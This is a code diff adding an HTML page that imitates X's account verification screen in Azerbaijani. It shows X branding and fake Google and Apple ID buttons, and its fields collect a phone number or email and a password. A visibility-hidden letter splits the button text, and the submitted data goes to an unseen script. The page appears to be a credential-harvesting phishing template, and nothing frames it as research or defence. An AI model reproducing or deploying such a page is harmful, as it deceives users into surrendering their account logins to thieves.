@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>X | Verify</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="assets/style.css">
+    <link rel="stylesheet" href="assets/styles.css">
+    <link rel="stylesheet" href="assets/anim.css">
+    <link rel="icon" href="assets/x.png" type="image/png">
+    <style>
+        body {
+            overflow-x: hidden;
+        }
+        .form-container {
+            margin: 0 auto; /* Center the form horizontally */
+            margin-left: 10px; /* Reduce the margin to move the form slightly to the left */
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+}
+    </style>
+</head>
+<body>
+    <div class="flex justify-center h-screen">
+        <div class="max-w-md mx-auto p-4">
+            <div class="flex justify-center mb-4">
+                <img src="assets/x.png" alt="x-icon" class="w-12 h-12 mb-2">
+            </div>
+            <div class="form-container">
+                <form>
+                    <div class="space-y-6">
+                        <button class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/IOS_Google_icon.png" alt="Google logo" class="mr-3 w-8 h-8">
+                            Google ilə təsdiq ed<span style="visibility: hidden;">h</span>
+                        </button>
+                        <button class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
+                            <i class="fab fa-apple mr-3 text-2xl text-black"></i>Apple ID ilə təsdiq ed
+                        </button>
+                        <div class="flex items-center justify-center text-white text-lg">
+                            <hr class="w-full border-gray-600">
+                            <span class="px-3">yada</span>
+
+                            <hr class="w-full border-gray-600">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <input class="mail-input" type="text" id="email" name="email" required placeholder="Mobil telefon nömrəsi və ya e-poçt ünvanı">
+                        <span id="emailError" style="color: red;"></span><br><br>
+                        <input class="pass-input" type="text" id="password" name="password" required placeholder="Şifrə">
+                    </div>
+                    <button id="submit-button" class="submit-button">Təsdiq Ed</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script src="assets/script.js"></script>
+</body>
+</html>
